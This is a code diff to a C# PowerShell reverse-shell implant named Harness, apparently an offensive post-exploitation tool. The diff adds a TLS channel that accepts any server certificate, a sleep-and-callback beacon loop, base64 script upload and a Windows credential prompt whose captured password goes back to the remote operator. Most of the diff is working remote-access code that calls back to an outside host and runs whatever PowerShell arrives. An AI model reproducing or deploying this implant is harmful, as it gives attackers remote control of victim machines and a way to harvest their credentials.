@@ -20,6 +20,7 @@
  */
 
 #define HARNESS_DLL
+#define HARNESS_SSL
 namespace Harness
 {
 
@@ -30,44 +31,57 @@ namespace Harness
     using System.Net.Sockets;
     using System.Diagnostics;
     using System.Threading;
+    using System.Text.RegularExpressions;
     using System.Collections.ObjectModel;
     using System.Management.Automation;
     using System.Management.Automation.Runspaces;
     using PowerShell = System.Management.Automation.PowerShell;
     using PSObject = System.Management.Automation.PSObject;
-    using ErrorRecord = System.Management.Automation.ErrorRecord;
     using System.Collections.Generic;
     using System.Management.Automation.Host;
+    using System.Net.Security;
+    using System.Security.Cryptography.X509Certificates;
+    using System.Runtime.InteropServices;
+    using System.Security;
+    using System.Security.Permissions;
     
 
     public class Harness
     {
 
-        public NetworkStream stream;
+#if HARNESS_SSL
+        private bool SECURE = true;
+#else
+        private bool SECURE = false;
+#endif
+
+        public CustomStream stream;
         private TcpClient client;
+        private int sleep;
         private bool FORMAT = true;
-
+        public byte[] remoteIP_bytes = { 123, 456, 789, 123 };
+        public byte[] localIP_bytes = { 0, 0, 0, 0 };
+        public int remotePort = 9999;
+        public int localPort = 8000;
         private bool shouldExit;
-
         private int exitCode;
-
         private CustomPSHost host;
-
         private Runspace myRunSpace;
-
         private PowerShell ps;
-
         InitialSessionState state;
 
         private Harness()
         {
 
+            this.sleep = 0;
             this.host = new CustomPSHost(this);
             this.state = InitialSessionState.CreateDefault();
             this.state.AuthorizationManager = null;
             this.myRunSpace = RunspaceFactory.CreateRunspace(this.host, this.state);
             this.myRunSpace.ThreadOptions = PSThreadOptions.UseCurrentThread;
             this.myRunSpace.Open();
+            this.ps = PowerShell.Create();
+            this.ps.Runspace = this.myRunSpace;
 
         }
 
@@ -95,7 +109,16 @@ namespace Harness
         {
 
             Harness hcon = new Harness();
-            hcon.run();
+
+            do
+            {
+
+                hcon.Run();
+                Thread.Sleep(hcon.sleep);
+
+            } while (hcon.sleep > 0);
+
+            hcon.CleanUp();
 
 #if HARNESS_DLL
 
@@ -103,7 +126,7 @@ namespace Harness
 #endif
         }
 
-        private void run()
+        private void Run()
         {
 
 
@@ -119,148 +142,163 @@ namespace Harness
 
             // Buffer for reading data 
             byte[] bytes;
-
+            
             // Holds string representation of data send over the wire
             string data = "";
 
             // Used to accumulate data from imported file
             string data_chunk = "";
-
+            
             // Replace ReverseShell() with BindShell() as needed
             this.client = ReverseShell();
-            this.stream = client.GetStream();
 
-            using (this.ps = PowerShell.Create())
+            this.stream = new CustomStream(this, this.client, this.SECURE);
+
+            while (!this.ShouldExit)
             {
-                while (!this.ShouldExit)
+                    
+                if (this.stream.CanRead())
                 {
+                        
+                    bytes = new byte[client.ReceiveBufferSize];
 
-                    if (stream.CanRead)
+                    int i;
+                    // Loop to receive all the data sent by the client.
+                    while ((i = this.stream.Read(bytes, 0, bytes.Length)) != 0)
                     {
-
-                        bytes = new byte[client.ReceiveBufferSize];
-
-                        int i;
-                        // Loop to receive all the data sent by the client.
-                        while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
+                        // Deal with multiline script by prompting for more input (e.g. >>)
+                        if (MULTILINE_FLAG)
                         {
-                            // Deal with multiline script by prompting for more input (e.g. >>)
-                            if (MULTILINE_FLAG)
+
+                            data_chunk = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();
+
+                            // Check to see if the user wants to break out of multiline
+                            if (data_chunk == HARNESS_CMD_CHAR + USER_BREAK)
                             {
 
-                                data_chunk = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();
+                                ProcessPS(data);
+                                MULTILINE_FLAG = false;
+                                data = "";
+                            }
+                            else
+                            {
+                                data += data_chunk;
+                            }
 
-                                // Check to see if the user wants to break out of multiline
-                                if (data_chunk == HARNESS_CMD_CHAR + USER_BREAK)
+                        }
+                        else if (REMOTEFILE_FLAG)
+                        {
+                            // Need to check and see if the script is done transfering
+                            data_chunk = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();
+
+                            if (data_chunk.ToLower() == ENDFILE_TAG)
+                            {
+
+                                Debug.WriteLine("[DEBUG] File received");
+
+                                data = Encoding.UTF8.GetString(Convert.FromBase64String(data));
+                                if (IsValid(data))
                                 {
-
                                     ProcessPS(data);
-                                    MULTILINE_FLAG = false;
-                                    data = "";
                                 }
                                 else
                                 {
-                                    data += data_chunk;
+                                    this.host.UI.WriteLine("[!] Transfer errors found. Try import again");
+                                }
+
+                                data = "";
+                                REMOTEFILE_FLAG = false;
+                            }
+                            else
+                            {
+                                data += data_chunk;
+                                data_chunk = "";
+                            }
+
+                        }
+                        else
+                        {
+
+                            data = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();
+
+                            if (data.ToLower() == "exit" || data.ToLower() == "quit")
+                            {
+                                this.sleep = 0;
+                                break;
+                            }    
+                                   
+
+                            if (data.ToLower() == BEGINFILE_TAG)
+                            {
+
+                                Debug.WriteLine("[DEBUG] Receiving File");
+
+                                REMOTEFILE_FLAG = true;
+                                data = "";
+                            }
+
+                            if (!string.IsNullOrEmpty(data) && !REMOTEFILE_FLAG)
+                            {
+
+                                Debug.WriteLine("[DEBUG] Command Received: " + data.ToString());
+
+                                // ProcessLocal is reserved for non-PS Harness commands that require special handling
+                                if (data[0] == HARNESS_CMD_CHAR)
+                                {
+
+                                    if (!ProcessLocal(data))
+                                    {
+                                        break;
+                                    }
+                                           
+                                    data = "";
+
                                 }
 
                             }
-                            else if (REMOTEFILE_FLAG)
+                        }
+
+                        // Determine how we deal with the data received
+                        if (!REMOTEFILE_FLAG)
+                        {
+                            if (IsValid(data))
                             {
-                                // Need to check and see if the script is done transfering
-                                data_chunk = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();
 
-                                if (data_chunk.ToLower() == ENDFILE_TAG)
-                                {
-
-                                    Debug.WriteLine("[DEBUG] File received");
-
-                                    if (IsValid(data))
-                                    {
-                                        ProcessPS(data);
-                                    }
-                                    else
-                                    {
-                                        this.host.UI.WriteLine("[!] Transfer errors found. Try import again");
-                                    }
-
-                                    data = "";
-                                    REMOTEFILE_FLAG = false;
-                                }
-                                else
-                                {
-                                    data += data_chunk;
-                                    data_chunk = "";
-                                }
+                                ProcessPS(data);
+                                data = "";
+                                MULTILINE_FLAG = false;
 
                             }
                             else
                             {
 
-                                data = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();
-
-                                if (data.ToLower() == "exit" || data.ToLower() == "quit") break;
-                                if (data.ToLower() == BEGINFILE_TAG)
-                                {
-
-                                    Debug.WriteLine("[DEBUG] Receiving File");
-
-                                    REMOTEFILE_FLAG = true;
-                                    data = "";
-                                }
-
-                                if (data != "" && !REMOTEFILE_FLAG)
-                                {
-
-                                    Debug.WriteLine("[DEBUG] Command Received: " + data.ToString());
-
-                                    // ProcessLocal is reserved for non-PS Harness commands that require special handling
-                                    if (data[0] == HARNESS_CMD_CHAR)
-                                    {
-
-                                        ProcessLocal(data);
-                                        data = "";
-
-                                    }
-
-                                }
-                            }
-
-                            // Determine how we deal with the data received
-                            if (!REMOTEFILE_FLAG)
-                            {
-                                if (IsValid(data))
-                                {
-
-                                    ProcessPS(data);
-                                    data = "";
-                                    MULTILINE_FLAG = false;
-
-                                }
-                                else
-                                {
-
-                                    Debug.WriteLine("[DEBUG] Incomplete script or parse error");
-                                    MULTILINE_FLAG = true;
-                                    this.host.UI.Write(">> ");
-
-                                }
+                                Debug.WriteLine("[DEBUG] Incomplete script or parse error");
+                                MULTILINE_FLAG = true;
+                                this.host.UI.Write(">> ");
 
                             }
 
                         }
 
-                        // Shutdown and end connection
-                        client.Close();
-
-                        Debug.WriteLine("[DEBUG] Connection Closed");
-
-                        break;
                     }
 
+                    // Shutdown and end connection
+                    client.Close();
+
+                    Debug.WriteLine("[DEBUG] Connection Closed");
+
+                    break;
                 }
 
             }
+        
+        }
 
+        private void CleanUp()
+        {
+
+            this.myRunSpace.Dispose();
+            this.ps.Dispose();
         }
 
         private TcpClient ReverseShell()
@@ -270,27 +308,25 @@ namespace Harness
 
 
             TcpClient client = new TcpClient();
-
+             
             try
             {
 
-                byte[] remoteIP = { 192, 168, 142, 129 };
-                IPAddress IP = new IPAddress(remoteIP);
-                client.Connect(IP, 9999);
-
+                IPAddress IP = new IPAddress(this.remoteIP_bytes);
+                client.Connect(IP, this.remotePort);
+                
             }
             catch (Exception err)
             {
 
                 Debug.WriteLine("[ERROR] Connection failed!");
 
-
                 System.Environment.Exit(1);
 
             }
 
             return client;
-
+            
         }
 
         private TcpClient BindShell()
@@ -299,9 +335,8 @@ namespace Harness
             Debug.WriteLine("[DEBUG] In BindShell");
 
             // Create TcpListener
-            byte[] localIP = { 0, 0, 0, 0 };
-            IPAddress localAddr = new IPAddress(localIP);
-            TcpListener server = new TcpListener(localAddr, 8000);
+            IPAddress localAddr = new IPAddress(this.localIP_bytes);
+            TcpListener server = new TcpListener(localAddr, this.localPort);
 
             // Start listening for client requests.
             server.Start();
@@ -345,17 +380,17 @@ namespace Harness
             return true;
         }
 
-        private void ProcessLocal(String cmd)
+        private bool ProcessLocal(String cmd)
         {
 
             Debug.WriteLine("[DEBUG] In ProcessLocal");
             Debug.WriteLine(cmd);
-
-
             String results = "";
+            bool rtn = true;
 
+            
             cmd = cmd.Substring(1, cmd.Length - 1);
-            cmd = cmd.ToLower();
+            cmd = cmd.ToLower().TrimEnd(' ');
 
             string[] tokens = cmd.Split(' ');
             switch (tokens[0])
@@ -373,11 +408,121 @@ namespace Harness
                     results = "[-] Formatting removed";
                     break;
 
+                case "sleep":
+
+                    DateTime now = DateTime.Now;
+                    DateTime dts;
+                    TimeSpan t;
+                    DateTime nextcallback;
+                    string _token = "UNDEFINED";
+
+                    if (tokens.Length == 2)
+                    {
+                        
+
+                        if (tokens[1][0] == '+')
+                        {
+
+                            
+                            switch (tokens[1][tokens[1].Length-1])
+                            {
+
+                                case 'd':
+                                    double days;
+
+                                    if(double.TryParse(tokens[1].Substring(1, tokens[1].Length - 2), out days))
+                                    {
+
+                                        _token = DateTime.Now.AddDays(days).ToString();
+
+                                    }
+    
+                                    break;
+
+                                case 'h':
+
+                                    double hours;
+
+                                    if(double.TryParse(tokens[1].Substring(1, tokens[1].Length - 2), out hours))
+                                    {
+
+                                        _token = DateTime.Now.AddHours(hours).ToString();
+
+                                    }
+
+                                    break;
+
+                                case 'm':
+
+                                    double minutes;
+
+                                    
+                                    if(double.TryParse(tokens[1].Substring(1, tokens[1].Length - 2), out minutes))
+                                    {
+
+                                        _token = DateTime.Now.AddMinutes(minutes).ToString();
+
+                                    }
+
+                                    break;
+
+                                case 's':
+
+                                    double seconds;
+
+                                    if(double.TryParse(tokens[1].Substring(1, tokens[1].Length - 2), out seconds))
+                                    {
+
+                                        _token = DateTime.Now.AddSeconds(seconds).ToString();
+
+                                    }
+                                    break;
+
+                            }
+                        }
+                        else
+                        {
+                            _token = tokens[1];
+                        }
+                        
+                    }
+                    else if (tokens.Length == 3)
+                    {
+                        _token = tokens[1] + " " + tokens[2];
+                    } 
+
+                    if (DateTime.TryParse(_token, out dts))
+                    {
+                        
+                        TimeSpan diff = dts - now;
+
+                        if (diff.TotalMilliseconds < 0)
+                        {
+                            diff = diff.Add(TimeSpan.FromHours(24));
+                        }
+
+                        double diff_in_milli = diff.TotalMilliseconds;
+                        t = TimeSpan.FromMilliseconds(diff_in_milli);
+
+                        nextcallback = now.AddMilliseconds(diff_in_milli);
+                        results = t.ToString();
+                        results = "[+] Sleeping for " + results + ", next callback at " + nextcallback.ToString();
+
+                        this.sleep = (int)diff.TotalMilliseconds;
+                        rtn = false;
+                    }
+                    else
+                    {
+                        results = "[-] Invalid sleep parameter " + _token.ToString();
+                    }
+                                    
+                    break;
+
             }
 
 
             this.host.UI.Write(results + "\r\n");
-
+            return rtn;
         }
 
         private void ProcessPS(String data)
@@ -397,22 +542,18 @@ namespace Harness
                 {
                     this.ps.AddCommand("Out-String");
                 }
-
+                
                 Debug.WriteLine("Invoking...");
 
                 PSDataCollection<PSObject> PSOutput = new PSDataCollection<PSObject>();
                 PSOutput.DataAdded += PSOutput_DataAdded;
-                ps.Streams.Error.DataAdded += Error_DataAdded;
-                ps.Streams.Warning.DataAdded += Warning_DataAdded;
-                ps.Streams.Verbose.DataAdded += Verbose_DataAdded;
-                ps.Streams.Debug.DataAdded += Debug_DataAdded;
 
-                // There is bug where the script freezes if errors are sent to the Error Stream. 
-                // I'm not sure why it happens, but merging with the output stream is the work around for now
-                this.ps.Commands.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
+                // Warning, Debug, and Verbose streams invoke PSHostUserInterface methods accordingly, 
+                // but the Error stream does not. I have no idea why and the documentation is limited.
+                // To solve this problem an event handler is added to trigger when errors are created.
+                this.ps.Streams.Error.DataAdded += Error_DataAdded;
 
                 IAsyncResult async = this.ps.BeginInvoke<PSObject, PSObject>(null, PSOutput);
-
                 while (async.IsCompleted == false)
                 {
                     // not much difference between ps.Invoke(). Could be used for future feature of background jobs
@@ -439,89 +580,30 @@ namespace Harness
             foreach (PSObject result in results)
             {
 
-
                this.host.UI.WriteLine(result.ToString());
-
-                
+             
             }
-
 
         }
 
         private void Error_DataAdded(object sender, DataAddedEventArgs e)
         {
 
-
             Debug.WriteLine("[DEBUG] New Error Added");
 
-            foreach (var errRecord in this.ps.Streams.Error)
+            Collection<ErrorRecord> errors = this.ps.Streams.Error.ReadAll();
+
+            Debug.WriteLine("[DEBUG] Clearing Errors");
+            this.ps.Streams.Error.Clear();
+            foreach (var errRecord in errors)
             {
 
-                this.host.UI.WriteErrorLine(errRecord.ToString() + "\r\n");
+                this.host.UI.WriteErrorLine(errRecord.ToString());
 
 
             }
 
-            Debug.WriteLine("[DEBUG] Clearing errors");
-            ps.Streams.Error.Clear();
-         
         }
-
-        private void Warning_DataAdded(object sender, DataAddedEventArgs e)
-        {
-
-            Debug.WriteLine("[DEBUG] New Warning Added");
-
-
-            foreach (var warningRecord in this.ps.Streams.Warning)
-            {
-
-
-                this.host.UI.WriteWarningLine(warningRecord.ToString() + "\r\n");
-
-
-            }
-
-            ps.Streams.Warning.Clear();
-
-        }
-
-        private void Verbose_DataAdded(object sender, DataAddedEventArgs e)
-        {
-
-
-            Debug.WriteLine("[DEBUG] New Verbose Added");
-
-            foreach (var verboseRecord in this.ps.Streams.Verbose)
-            {
-
-                this.host.UI.WriteVerboseLine(verboseRecord.ToString() + "\r\n");
-
-
-            }
-
-            ps.Streams.Verbose.Clear();
-
-        }
-
-        private void Debug_DataAdded(object sender, DataAddedEventArgs e)
-        {
-
-            Debug.WriteLine("[DEBUG] New Debug Added");
-
-
-            foreach (var debugRecord in this.ps.Streams.Debug)
-            {
-
-                this.host.UI.WriteDebugLine(debugRecord.ToString() + "\r\n");
-
-
-            }
-
-            ps.Streams.Debug.Clear();
-
-        }
-
 
         class CustomPSHost : PSHost
         {
@@ -533,7 +615,7 @@ namespace Harness
             public CustomPSHost(Harness program)
             {
                 this.program = program;
-                this._ui = new CustomPSHostUserInterface(program);
+                this._ui = new CustomPSHostUserInterface(this.program);
             }
 
             public override Guid InstanceId
@@ -543,7 +625,7 @@ namespace Harness
 
             public override string Name
             {
-                get { return " "; }
+                get { return "Harness"; }
             }
 
             public override Version Version
@@ -569,12 +651,12 @@ namespace Harness
 
             public override void EnterNestedPrompt()
             {
-                throw new NotImplementedException("EnterNestedPrompt is not implemented. Yet ");
+                throw new NotImplementedException("EnterNestedPrompt is not implemented.  ");
             }
 
             public override void ExitNestedPrompt()
             {
-                throw new NotImplementedException("ExitNestedPrompt is not implemented. Yet");
+                throw new NotImplementedException("ExitNestedPrompt is not implemented. ");
             }
 
             public override void NotifyBeginApplication()
@@ -610,7 +692,7 @@ namespace Harness
             private void SendOutput(String output)
             {
 
-                if (this.program.stream.CanWrite)
+                if (this.program.stream.CanWrite())
                 {
 
                     Debug.WriteLine("[DEBUG] Sending: " + output.ToString());
@@ -624,48 +706,57 @@ namespace Harness
 
             public override void WriteLine()
             {
+                Debug.WriteLine("[DEBUG] WriteLine() called");
                 this.SendOutput("\n");              
             }
 
-            public override void WriteLine(string value)
+            public override void WriteLine(String value)
             {
+                Debug.WriteLine("[DEBUG] WriteLine(String) called");
                 this.SendOutput(value);
             }
 
-            public override void WriteLine(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
+            public override void WriteLine(ConsoleColor foregroundColor, ConsoleColor backgroundColor, String value)
             {
+                Debug.WriteLine("[DEBUG] WriteLine(consolecoler, consolecolor, string) called");
                 this.SendOutput(value + "\n");             
             }
 
-            public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
+            public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, String value)
             {
+                Debug.WriteLine("[DEBUG] Write(consolecoler, consolecolor, string) called");
                 this.SendOutput(value);
             }
 
-            public override void Write(string value)
+            public override void Write(String value)
             {
+                Debug.WriteLine("[DEBUG] Write(string) called");
                 this.SendOutput(value);             
             }
 
-            public override void WriteDebugLine(string value)
+
+            public override void WriteDebugLine(String value)
             {
-                this.SendOutput("DEBUG: " + value);           
+                Debug.WriteLine("[DEBUG] WriteDebugLine(string) called");
+                this.SendOutput("DEBUG: " + value + "\n");           
             }
 
-            public override void WriteErrorLine(string value)
+            public override void WriteErrorLine(String value)
             {
-                
-                this.SendOutput("ERROR: " + value);                
+                Debug.WriteLine("[DEBUG] WriteErrorLine(string) called");
+                this.SendOutput("ERROR: " + value + "\n");                
             }
 
-            public override void WriteVerboseLine(string message)
+            public override void WriteVerboseLine(String message)
             {
-                this.SendOutput("VERBOSE: " + message);                
+                Debug.WriteLine("[DEBUG] WriteVerboseLine(string) called");
+                this.SendOutput("VERBOSE: " + message + "\n");                
             }
 
-            public override void WriteWarningLine(string message)
+            public override void WriteWarningLine(String message)
             {
-                this.SendOutput("WARNING: " + message);
+                Debug.WriteLine("[DEBUG] WriteWarningLine(string) called");
+                this.SendOutput("WARNING: " + message + "\n");
             }
 
             public override void WriteProgress(long sourceId, ProgressRecord record)
@@ -681,25 +772,254 @@ namespace Harness
             public override Dictionary<string, PSObject> Prompt(string caption, string message, System.Collections.ObjectModel.Collection<FieldDescription> descriptions)
             {
 
-                throw new NotImplementedException("Prompt is not implemented yet.");
+                this.Write(caption + "\n" + message + " ");
+                Dictionary<string, PSObject> results = new Dictionary<string, PSObject>();
+
+                foreach (FieldDescription fd in descriptions)
+                {
+                    string[] label = GetHotkeyAndLabel(fd.Label);
+                    this.WriteLine(label[1]);
+
+                    string data = this.ReadLine();
+
+                    if (data == null)
+                    {
+                        return null;
+                    }
+
+                    results[fd.Name] = PSObject.AsPSObject(data);
+                }
+
+                return results;
 
             }
 
+            // Ripped and modified from MSDN example
             public override int PromptForChoice(string caption, string message, System.Collections.ObjectModel.Collection<ChoiceDescription> choices, int defaultChoice)
             {
-                throw new NotImplementedException("PromptForChoice is not implemented yet.");
+                
+                this.WriteLine(caption + "\n" + message + "\n");
+                string[,] promptData = BuildHotkeysAndPlainLabels(choices);
+                // Format the overall choice prompt string to display.
+                StringBuilder sb = new StringBuilder();
+
+                for (int element = 0; element < choices.Count; element++)
+                {
+                    sb.Append(String.Format("[{0}] {1} ", promptData[0, element], promptData[1, element]));
+                }
+
+                sb.Append(String.Format("(Default is {0})", promptData[0, defaultChoice]));
+
+                // Read prompts until a match is made, the default is
+                // chosen, or the loop is interrupted with ctrl-C.            
+                while (true)
+                {
+
+                    this.WriteLine(sb.ToString());
+
+                    string data = this.ReadLine();
+
+                    // If the choice string was empty, use the default selection.
+                    if (string.IsNullOrEmpty(data))
+                    {
+                        return defaultChoice;
+                    }
+
+                    // See if the selection matched and return the
+                    // corresponding index if it did.
+                    for (int j = 0; j < choices.Count; j++)
+                    {
+                        if (promptData[0, j] == data)
+                        {
+                            return j;
+                        }
+                    }
+
+                    this.WriteErrorLine("Invalid choice: " + data);
+
+                    
+                }
+                 
             }
+
+            // Modified from MSDN example
+            private static string[] GetHotkeyAndLabel(string input)
+            {
+                string[] result = new string[] { String.Empty, String.Empty };
+                string[] fragments = input.Split('&');
+                if (fragments.Length == 2)
+                {
+                    if (fragments[1].Length > 0)
+                    {
+                        result[0] = fragments[1][0].ToString();
+                        
+                    }
+
+                    result[1] = (fragments[0] + fragments[1]).Trim();
+                }
+                else
+                {
+                    result[1] = input;
+                }
+
+                return result;
+            }
+
+            // Modified from MSDN example
+            private static string[,] BuildHotkeysAndPlainLabels(Collection<ChoiceDescription> choices)
+            {
+                // Allocate the result array
+                string[,] hotkeysAndPlainLabels = new string[2, choices.Count];
+
+                for (int i = 0; i < choices.Count; ++i)
+                {
+                    string[] hotkeyAndLabel = GetHotkeyAndLabel(choices[i].Label);
+                    hotkeysAndPlainLabels[0, i] = hotkeyAndLabel[0];
+                    hotkeysAndPlainLabels[1, i] = hotkeyAndLabel[1];
+                }
+
+                return hotkeysAndPlainLabels;
+            }
+
+
+            [DllImport("ole32.dll")]
+            public static extern void CoTaskMemFree(IntPtr ptr);
+
+            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+            private struct CREDUI_INFO
+            {
+                public int cbSize;
+                public IntPtr hwndParent;
+                public string pszMessageText;
+                public string pszCaptionText;
+                public IntPtr hbmBanner;
+            }
+
+
+            [DllImport("credui.dll", CharSet = CharSet.Auto)]
+            private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
+                                                                       IntPtr pAuthBuffer,
+                                                                       uint cbAuthBuffer,
+                                                                       StringBuilder pszUserName,
+                                                                       ref int pcchMaxUserName,
+                                                                       StringBuilder pszDomainName,
+                                                                       ref int pcchMaxDomainame,
+                                                                       StringBuilder pszPassword,
+                                                                       ref int pcchMaxPassword);
+
+            [DllImport("credui.dll", CharSet = CharSet.Auto)]
+            private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
+                                                                         int authError,
+                                                                         ref uint authPackage,
+                                                                         IntPtr InAuthBuffer,
+                                                                         uint InAuthBufferSize,
+                                                                         out IntPtr refOutAuthBuffer,
+                                                                         out uint refOutAuthBufferSize,
+                                                                         ref bool fSave,
+                                                                         int flags);
+
+            [DllImport("credui.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            private static extern Boolean CredPackAuthenticationBuffer(int dwFlags,
+                                                                      string pszUserName,
+                                                                      string pszPassword,
+                                                                      IntPtr pPackedCredentials,
+                                                                      ref int pcbPackedCredentials);
+
+
+            // Adapated from http://stackoverflow.com/questions/4134882/show-authentication-dialog-in-c-sharp-for-windows-vista-7
+            // NOTE: This function is not fully realized yet, but should allow for prompting the users for credentials (e.g. get-credentials)
+            //       This has not been fully tested on a funtioning domain yet. Please report bugs; especially for Kerberos implementations
+            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
+            {
+
+                Debug.WriteLine("caption: " + caption + "\nmessage: " + message + "\nuserName: " + userName + "\ntarget: " + targetName);
+                CREDUI_INFO credui = new CREDUI_INFO();
+                credui.pszCaptionText = caption;
+                credui.pszMessageText = message;
+                credui.hwndParent = IntPtr.Zero;
+                credui.cbSize = Marshal.SizeOf(credui);
+                uint authPackage = 0;
+                IntPtr outCredBuffer = new IntPtr();
+                uint outCredSize = 1024;
+                bool save = false;
+
+                String domain = "null_domain";
+                //String _password = "test";
+                SecureString password = new SecureString();
+                PSCredential creds;
+
+                // NOTE: The following 3 lines were an attempt to get the login prompt to fill-in user specified values
+                //       this is still a work in progress.
+                // int inCredSize = 1024;
+                // IntPtr inCredBuffer = Marshal.AllocCoTaskMem(inCredSize);
+                // CredPackAuthenticationBuffer(0, userName, _password, inCredBuffer, ref inCredSize);
+
+                int result = CredUIPromptForWindowsCredentials(ref credui,
+                                                               0,
+                                                               ref authPackage,
+                                                               IntPtr.Zero,         // inCredBuffer
+                                                               0,
+                                                               out outCredBuffer,
+                                                               out outCredSize,
+                                                               ref save,
+                                                               0x1);
+
+                var usernameBuf = new StringBuilder(100);
+                var passwordBuf = new StringBuilder(100);
+                var domainBuf = new StringBuilder(100);
+
+                int maxUserName = 100;
+                int maxDomain = 100;
+                int maxPassword = 100;
+                if (result == 0)
+                {
+                    // Convert authentication buffer returned by CredUnPackAuthenticationBuffer to string username and password
+                    if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
+                                                       domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
+                    {
+
+                        //clear the memory allocated by CredUIPromptForWindowsCredentials 
+                        CoTaskMemFree(outCredBuffer);
+
+                        domain = domainBuf.ToString();
+
+                        if (!string.IsNullOrEmpty(userName))
+                        {
+                            userName = domain + "/" + usernameBuf.ToString();
+                        }
+                        else
+                        {
+                            userName = usernameBuf.ToString();
+                        }
+                        
+                        Array.ForEach(passwordBuf.ToString().ToCharArray(), password.AppendChar); // May leave cleartext in memory :/
+                        password.MakeReadOnly();
+                        
+                        creds = new PSCredential(userName, password);
+
+                    }
+                    else
+                    {
+                        creds = new PSCredential(userName, password);
+                    }
+
+                }
+                else
+                {
+                    creds = new PSCredential(userName, password);
+                }
+
+                return creds;
+
+            }
+
 
             public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName, PSCredentialTypes allowedCredentialTypes, PSCredentialUIOptions options)
             {
-                throw new NotImplementedException("PromptForCredential1 is not implemented yet.");
+                return this.PromptForCredential(caption, message, userName, targetName);
             }
 
-            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
-            {
-                throw new NotImplementedException("PromptForCredential2 is not implemented yet.");
-            }
-
+            
             public override PSHostRawUserInterface RawUI
             {
                 get { return this._rawUi; }
@@ -707,7 +1027,19 @@ namespace Harness
 
             public override string ReadLine()
             {
-                throw new NotImplementedException("ReadLine is not implemented.");
+                int i;
+                byte[] bytes = new byte[this.program.client.ReceiveBufferSize];
+                string data = "";
+
+                // Loop to receive all the data sent by the client.
+                while ((i = this.program.stream.Read(bytes, 0, bytes.Length)) != 0)
+                {
+
+                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();
+                    break;
+                }
+
+                return data;
             }
 
             public override System.Security.SecureString ReadLineAsSecureString()
@@ -736,7 +1068,7 @@ namespace Harness
             private Size _maxWindowSize = new Size { Width = 100, Height = 100 };
             private Size _bufferSize = new Size { Width = 100, Height = 1000 };
             private Coordinates _windowPosition = new Coordinates { X = 0, Y = 0 };
-            private String _windowTitle = "";
+            private String _windowTitle = " ";
 
             public override ConsoleColor BackgroundColor
             {
@@ -835,6 +1167,117 @@ namespace Harness
 
     }
 
+    public class CustomStream
+    {
+
+        private NetworkStream clear_stream;
+        private SslStream secure_stream;
+        private bool SECURE;
+        private Harness program;
+
+        public CustomStream(Harness program, TcpClient client, bool SECURE)
+        {
+
+            if (SECURE)
+            {
+                this.secure_stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null);
+                this.program = program;
+                this.secure_stream.AuthenticateAsClient(BytesToIPv4String(this.program.remoteIP_bytes));
+                this.SECURE = true;
+            }
+            else
+            {
+                this.clear_stream = client.GetStream();
+                this.SECURE = false;
+            }
+
+        }
+
+        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
+        {
+
+            return true; // Sure the cert is valid
+        }
+
+        private string BytesToIPv4String(byte[] barray)
+        {
+
+            string IP = "";
+            for (int i = 0; i < barray.Length; i++)
+            {
+                IP += barray[i].ToString();
+
+                if (i != barray.Length - 1)
+                {
+
+                    IP += ".";
+                }
+            }
+
+            return IP;
+        }
+
+        public bool CanRead()
+        {
+            if (this.SECURE)
+            {
+
+                return this.secure_stream.CanRead;
+
+            }
+            else
+            {
+                return this.clear_stream.CanRead;
+            }
+
+        }
+
+        public bool CanWrite()
+        {
+            if (this.SECURE)
+            {
+
+                return this.secure_stream.CanWrite;
+
+            }
+            else
+            {
+                return this.clear_stream.CanWrite;
+            }
+
+        }
+
+        public int Read(byte[] bytes, int x, int Length)
+        {
+
+            if (this.SECURE)
+            {
+                return this.secure_stream.Read(bytes, x, bytes.Length);
+            }
+            else
+            {
+                return this.clear_stream.Read(bytes, x, bytes.Length);
+            }
+
+        }
+
+        public void Write(Byte[] outputBytes, int x, int Length)
+        {
+
+            if (this.SECURE)
+            {
+                this.secure_stream.Write(outputBytes, x, outputBytes.Length);
+            }
+            else
+            {
+                this.clear_stream.Write(outputBytes, x, outputBytes.Length);
+            }
+
+        }
+
+    }
+
+    
 }
 
 
